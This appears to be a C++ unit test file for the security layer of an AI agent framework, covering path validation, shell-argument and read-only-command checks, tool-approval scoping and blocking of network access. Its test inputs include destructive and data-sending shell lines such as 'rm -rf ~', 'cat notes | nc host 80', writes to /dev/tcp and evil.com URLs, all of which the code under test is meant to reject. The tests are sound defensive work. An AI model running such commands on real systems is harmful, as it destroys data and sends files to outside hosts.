// Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
// SPDX-License-Identifier: MIT

#include <gtest/gtest.h>
#include <gaia/security.h>
#include <gaia/tool_registry.h>

#include <filesystem>
#include <fstream>
#include <string>

using namespace gaia;
namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// validatePath
// ---------------------------------------------------------------------------

class ValidatePathTest : public ::testing::Test {
protected:
    fs::path tmpBase;

    void SetUp() override {
        tmpBase = fs::temp_directory_path() / "gaia_pathtest";
        fs::create_directories(tmpBase);
    }

    void TearDown() override {
        fs::remove_all(tmpBase);
    }
};

TEST_F(ValidatePathTest, ValidPathInsideBase) {
    fs::path child = tmpBase / "subdir" / "file.txt";
    fs::create_directories(child.parent_path());
    // Create the file so realpath can resolve it
    { std::ofstream f(child); f << "x"; }
    EXPECT_TRUE(validatePath(tmpBase.string(), child.string()));
}

TEST_F(ValidatePathTest, IdenticalPaths) {
    EXPECT_TRUE(validatePath(tmpBase.string(), tmpBase.string()));
}

TEST_F(ValidatePathTest, PathTraversalBlocked) {
    // Construct a path that uses .. to escape tmpBase
    fs::path escape = tmpBase / ".." / "escape.txt";
    EXPECT_FALSE(validatePath(tmpBase.string(), escape.string()));
}

TEST_F(ValidatePathTest, NonExistentRequestedPath) {
    // realpath requires the path to exist on POSIX; a non-existent path returns false.
    fs::path nonExistent = tmpBase / "does_not_exist.txt";
    EXPECT_FALSE(validatePath(tmpBase.string(), nonExistent.string()));
}

TEST_F(ValidatePathTest, EmptyPaths) {
    EXPECT_FALSE(validatePath("", tmpBase.string()));
    EXPECT_FALSE(validatePath(tmpBase.string(), ""));
    EXPECT_FALSE(validatePath("", ""));
}

// ---------------------------------------------------------------------------
// isSafeShellArg
// ---------------------------------------------------------------------------

TEST(IsSafeShellArgTest, SafeInputsAccepted) {
    EXPECT_TRUE(isSafeShellArg("hello"));
    EXPECT_TRUE(isSafeShellArg("filename.txt"));
    EXPECT_TRUE(isSafeShellArg("CamelCase123"));
    EXPECT_TRUE(isSafeShellArg("dash-ok"));
    EXPECT_TRUE(isSafeShellArg("under_score"));
    EXPECT_TRUE(isSafeShellArg("path/to/file"));
    EXPECT_TRUE(isSafeShellArg("C:\\Windows\\file"));
}

TEST(IsSafeShellArgTest, InjectionCharsRejected) {
    EXPECT_FALSE(isSafeShellArg("hello world"));   // space
    EXPECT_FALSE(isSafeShellArg("cmd;evil"));       // semicolon
    EXPECT_FALSE(isSafeShellArg("a|b"));            // pipe
    EXPECT_FALSE(isSafeShellArg("a&&b"));           // &&
    EXPECT_FALSE(isSafeShellArg("$(evil)"));        // command substitution
    EXPECT_FALSE(isSafeShellArg("`cmd`"));          // backtick
    EXPECT_FALSE(isSafeShellArg("a>out"));          // redirect
    EXPECT_FALSE(isSafeShellArg("<in"));            // redirect
    EXPECT_FALSE(isSafeShellArg("'quoted'"));       // single quote
    EXPECT_FALSE(isSafeShellArg("\"quoted\""));     // double quote
    EXPECT_FALSE(isSafeShellArg("$VAR"));           // variable
}

TEST(IsSafeShellArgTest, EmptyStringRejected) {
    EXPECT_FALSE(isSafeShellArg(""));
}

// ---------------------------------------------------------------------------
// AllowedToolsStore
// ---------------------------------------------------------------------------

class AllowedToolsStoreTest : public ::testing::Test {
protected:
    fs::path storeDir;
    std::unique_ptr<AllowedToolsStore> store;

    void SetUp() override {
        storeDir = fs::temp_directory_path() / "gaia_store_test";
        fs::remove_all(storeDir);
        store = std::make_unique<AllowedToolsStore>(storeDir.string());
    }

    void TearDown() override {
        fs::remove_all(storeDir);
    }
};

TEST_F(AllowedToolsStoreTest, AddAndCheck) {
    EXPECT_FALSE(store->isAlwaysAllowed("read_file"));
    store->addAlwaysAllowed("read_file");
    EXPECT_TRUE(store->isAlwaysAllowed("read_file"));
    EXPECT_FALSE(store->isAlwaysAllowed("other_tool"));
}

TEST_F(AllowedToolsStoreTest, Persistence) {
    store->addAlwaysAllowed("check_adapter");
    store->addAlwaysAllowed("mcp_windows_Shell");

    // Reload from the same directory
    AllowedToolsStore reloaded(storeDir.string());
    EXPECT_TRUE(reloaded.isAlwaysAllowed("check_adapter"));
    EXPECT_TRUE(reloaded.isAlwaysAllowed("mcp_windows_Shell"));
    EXPECT_FALSE(reloaded.isAlwaysAllowed("nonexistent"));
}

TEST_F(AllowedToolsStoreTest, RemoveTool) {
    store->addAlwaysAllowed("tool_a");
    store->addAlwaysAllowed("tool_b");
    store->removeAlwaysAllowed("tool_a");

    EXPECT_FALSE(store->isAlwaysAllowed("tool_a"));
    EXPECT_TRUE(store->isAlwaysAllowed("tool_b"));
}

TEST_F(AllowedToolsStoreTest, ClearAll) {
    store->addAlwaysAllowed("tool_a");
    store->addAlwaysAllowed("tool_b");
    store->clearAll();

    EXPECT_FALSE(store->isAlwaysAllowed("tool_a"));
    EXPECT_FALSE(store->isAlwaysAllowed("tool_b"));
    EXPECT_TRUE(store->allAllowed().empty());

    // Persist of empty list: reload should also be empty
    AllowedToolsStore reloaded(storeDir.string());
    EXPECT_TRUE(reloaded.allAllowed().empty());
}

TEST_F(AllowedToolsStoreTest, CorruptFile) {
    fs::path storeFile = storeDir / "allowed_tools.json";
    { std::ofstream f(storeFile); f << "not valid json {{{{"; }

    // Constructing a store over a corrupt file must not throw; store starts empty.
    AllowedToolsStore reloaded(storeDir.string());
    EXPECT_TRUE(reloaded.allAllowed().empty());
}

TEST_F(AllowedToolsStoreTest, AllAllowed) {
    store->addAlwaysAllowed("tool_b");
    store->addAlwaysAllowed("tool_a");
    auto all = store->allAllowed();
    ASSERT_EQ(all.size(), 2u);
    // std::set returns sorted order
    EXPECT_EQ(all[0], "tool_a");
    EXPECT_EQ(all[1], "tool_b");
}

// ---------------------------------------------------------------------------
// makeStdinConfirmCallback
// ---------------------------------------------------------------------------

TEST(MakeStdinConfirmCallbackTest, ReturnsCallable) {
    gaia::ToolConfirmCallback cb = gaia::makeStdinConfirmCallback();
    EXPECT_TRUE(static_cast<bool>(cb));
}

// ---- shell grant scope ----

TEST(ShellCommandScopeTest, ProgramOrSubcommandOrExact) {
    EXPECT_EQ(shellCommandScope("pytest -q tests/"), "cmd:pytest");
    EXPECT_EQ(shellCommandScope("  ls -la "), "cmd:ls");
    EXPECT_EQ(shellCommandScope("git status"), "cmd:git status");
    EXPECT_NE(shellCommandScope("git push --force"), shellCommandScope("git status"));
    EXPECT_EQ(shellCommandScope("pytest && rm -rf ~"), "exact:pytest && rm -rf ~");
    EXPECT_EQ(shellCommandScope("cat a | sh"), "exact:cat a | sh");
    EXPECT_EQ(shellCommandScope("echo $(whoami)"), "exact:echo $(whoami)");
    EXPECT_EQ(shellCommandScope("python3 -c 'import os'"), "exact:python3 -c 'import os'");
    EXPECT_EQ(shellCommandScope("FOO=1 make"), "exact:FOO=1 make");
    // A wrapper or interpreter runs whatever it is handed, so the grant is for that line only.
    for (const char* line : {"perl script.pl", "env rm x", "xargs rm", "sudo ls", "node build.js",
                             "/usr/bin/ls", "./run.sh", "git -C elsewhere status", "git", "unknown-tool x"}) {
        EXPECT_EQ(shellCommandScope(line), std::string("exact:") + line) << line;
    }
    EXPECT_EQ(shellCommandScope("npm test -- --watch"), "cmd:npm test");
    EXPECT_EQ(shellCommandScope("mkdir -p out"), "cmd:mkdir");
}

TEST(ShellCommandScopeTest, AlwaysAllowCoversOnlyThatCommand) {
    const std::string dir = (std::filesystem::temp_directory_path() / "gaia-grant-scope-test").string();
    std::filesystem::remove_all(dir);
    auto store = std::make_shared<AllowedToolsStore>(dir);
    ToolRegistry reg;
    reg.setAllowedToolsStore(store);
    ToolInfo sh;
    sh.name = "sh";
    sh.policy = ToolPolicy::CONFIRM;
    sh.parameters = {{"command", ToolParamType::STRING, true, ""}};
    sh.callback = [](const json&) { return json{{"status", "success"}}; };
    sh.grantScope = [](const json& a) { return shellCommandScope(a.value("command", "")); };
    reg.registerTool(sh);

    int asked = 0;
    reg.setConfirmCallback([&asked](const std::string&, const json&) {
        ++asked;
        return asked == 1 ? ToolConfirmResult::ALWAYS_ALLOW : ToolConfirmResult::DENY;
    });
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "pytest -q"}})["status"], "success");
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "pytest -x"}})["status"], "success");
    EXPECT_EQ(asked, 1) << "the same program is approved";
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "rm -rf build"}})["status"], "error");
    EXPECT_EQ(asked, 2) << "a different program is asked about again";
    std::filesystem::remove_all(dir);
}

TEST(ReadOnlyShellCommandTest, OnlyPlainReadersPass) {
    for (const char* ok : {"ls -la", "hostname", "echo 'a & b'", "cat a.txt | grep foo | wc -l",
                           "find . -name '*.md'", "pwd; ls -la", "cd src && ls",
                           "ls cpp 2>/dev/null || echo none", "ls \"C:/Program Files\"",
                           "find . -name 'a;b'"}) {
        EXPECT_TRUE(isReadOnlyShellCommand(ok)) << ok;
    }
    for (const char* no : {"", "rm -rf x", "ls; rm x", "ls && rm x", "cat a > b", "echo $HOME",
                           "echo %PATH%", "cat $(which ls)", "find . -delete", "find . -exec rm {} ;",
                           "ls\nrm x", "python -c 1", "ls | sh", "ls ||", "; ls",
                           "ls & rm x", "ls 2> err.txt", "ls >> out", "ls 1>out",
                           // Quoting and escapes the shell removes before find sees the flag.
                           "find . \"-delete\"", "find . -de''lete", "find . -\\delete",
                           "find . '-exec' rm -rf {} +", "find . -fprintf out x", "find . -okdir rm {} ;",
                           // Programs that can write or run code.
                           "sort -ofile in", "uniq in out", "tree -o out", "rg --pre=sh x", "file -C -m x",
                           "git status", "git diff --output=x", "tee out", "xargs rm", "less x",
                           // Unbalanced quotes, subshells, history expansion.
                           "ls 'x", "(rm x)", "echo !!", "ls {a,b}",
                           // bash consumes a backslash, so the word it hides is unknown.
                           "ls \\\"x", "dir C:\\Users\\x", "cat a\\ b",
                           // A quoted program name, another case, a share, a write.
                           "\"ls\" -la", "'cat' x", "LS", "ls //server/share", "cat \\\\server\\share\\x",
                           "hostname newname", "ls 2>nul", "sort x", "awk 1 x", "sed -n p x"}) {
        EXPECT_FALSE(isReadOnlyShellCommand(no)) << no;
    }
}

TEST(ReadOnlyShellCommandTest, CmdExeTrustsOnlyBuiltins) {
    // cmd.exe runs find.bat from the current folder before the real find.
    for (const char* ok : {"dir", "DIR", "dir /s /b C:\\x", "dir /s /b C:\\Users\\x\\*.md", "type notes.txt",
                           "cd src && dir", "echo hi", "dir 2>nul"}) {
        EXPECT_TRUE(isReadOnlyShellCommand(ok, false)) << ok;
    }
    for (const char* no : {"find \"x\" a.txt", "where python", "whoami", "tree", "ls", "git status",
                           // ' is an ordinary letter to cmd.exe, so this & really chains.
                           "echo 'a & del x'", "dir \\\\server\\share", "dir 2>/dev/null", "echo %USERNAME%",
                           "echo a ^& b", "\"dir\""}) {
        EXPECT_FALSE(isReadOnlyShellCommand(no, false)) << no;
    }
}

TEST(InternetRefusalTest, RefusesWhatGoesOnline) {
    ToolInfo web;
    web.name = "web_fetch";
    EXPECT_NE(internetRefusal(web, {{"url", "https://example.com"}}), "");
    EXPECT_EQ(internetRefusal(web, {{"url", "http://localhost:8000/x"}}), "");
    EXPECT_EQ(internetRefusal(web, {{"url", "http://127.0.0.1:8000/x"}}), "");
    EXPECT_NE(internetRefusal(web, {{"url", "http://127.0.0.1.evil.com/"}}), "");
    EXPECT_NE(internetRefusal(web, {{"url", "http://localhost@evil.com/"}}), "");

    ToolInfo mcp;
    mcp.name = "search";
    mcp.mcpServer = "github";
    EXPECT_NE(internetRefusal(mcp, json::object()), "");

    ToolInfo sh;
    sh.name = "bash_execute";
    for (const char* online : {"curl https://example.com", "git pull", "git -C repo fetch origin",
                               "pip install requests", "npm install", "ssh host", "bash -c \"wget x.com\"",
                               "curl $(cat url)", "cat notes | nc host 80", "python fetch.py https://api.x.com"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
    }
    for (const char* rerouted : {"curl -x http://proxy:8080 http://localhost/x",
                                 "curl --resolve localhost:80:203.0.113.5 http://localhost/",
                                 "curl --connect-to localhost:80:example.com:80 http://localhost/",
                                 "https_proxy=http://proxy:8080 curl http://localhost/", "nslookup example.com",
                                 "cat notes > /dev/tcp/203.0.113.5/80", "python -c \"import socket\"",
                                 "node -e \"fetch('x')\"", "socat - TCP:host:80"}) {
        EXPECT_NE(internetRefusal(sh, {{"command", rerouted}}), "") << rerouted;
    }
    for (const char* local : {"ls -la", "git status", "curl http://localhost:13305/api/v1/health",
                              "python build.py", "python -m pytest tests", "node build.js"}) {
        EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
    }

    ToolInfo write;
    write.name = "file_write";
    EXPECT_EQ(internetRefusal(write, {{"path", "README.md"}, {"content", "see https://example.com"}}), "");
}

TEST(SplitShellCommandTest, SegmentsAndWords) {
    std::vector<std::vector<std::string>> s;
    ASSERT_TRUE(splitShellCommand("cd src && cat 'a b.txt' | wc -l; ls", true, s));
    ASSERT_EQ(s.size(), 4u);
    EXPECT_EQ(s[0], (std::vector<std::string>{"cd", "src"}));
    EXPECT_EQ(s[1], (std::vector<std::string>{"cat", "a b.txt"}));
    EXPECT_EQ(s[3], (std::vector<std::string>{"ls"}));
    ASSERT_TRUE(splitShellCommand("type it's.txt", false, s)) << "one quote character under cmd.exe";
    EXPECT_EQ(s[0], (std::vector<std::string>{"type", "it's.txt"}));
    for (const char* no : {"ls > out", "ls &", "echo $X", "echo `x`", "ls \"x", "", "ls |", "a\nb"}) {
        EXPECT_FALSE(splitShellCommand(no, true, s)) << no;
    }
}

TEST(AllowedToolsStoreHomeTest, NoHomeIsAnErrorNotASharedFolder) {
#ifdef _WIN32
    const char* name = "USERPROFILE";
#else
    const char* name = "HOME";
#endif
    const char* was = std::getenv(name);
    const std::string saved = was ? was : "";
#ifdef _WIN32
    _putenv_s(name, "");
#else
    unsetenv(name);
#endif
    EXPECT_THROW(AllowedToolsStore{}, std::runtime_error);
#ifdef _WIN32
    _putenv_s(name, saved.c_str());
#else
    if (was) setenv(name, saved.c_str(), 1);
#endif
}

TEST_F(AllowedToolsStoreTest, SaveLeavesNoTemporaryFile) {
    store->addAlwaysAllowed("file_write");
    size_t files = 0;
    for (const auto& e : std::filesystem::directory_iterator(storeDir)) {
        ++files;
        EXPECT_EQ(e.path().extension(), ".json") << e.path();
    }
    EXPECT_EQ(files, 1u);
}

TEST(ReadOnlyShellCommandTest, NeedsConfirmSkipsTheQuestion) {
    ToolRegistry reg;
    ToolInfo sh;
    sh.name = "sh";
    sh.policy = ToolPolicy::CONFIRM;
    sh.parameters = {{"command", ToolParamType::STRING, true, ""}};
    sh.callback = [](const json&) { return json{{"status", "success"}}; };
    sh.needsConfirm = [](const json& a) { return !isReadOnlyShellCommand(a.value("command", "")); };
    reg.registerTool(sh);
    int asked = 0;
    reg.setConfirmCallback([&asked](const std::string&, const json&) {
        ++asked;
        return ToolConfirmResult::DENY;
    });
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "ls -la"}})["status"], "success");
    EXPECT_EQ(asked, 0);
    EXPECT_EQ(reg.executeTool("sh", json{{"command", "rm -rf build"}})["status"], "error");
    EXPECT_EQ(asked, 1);
}
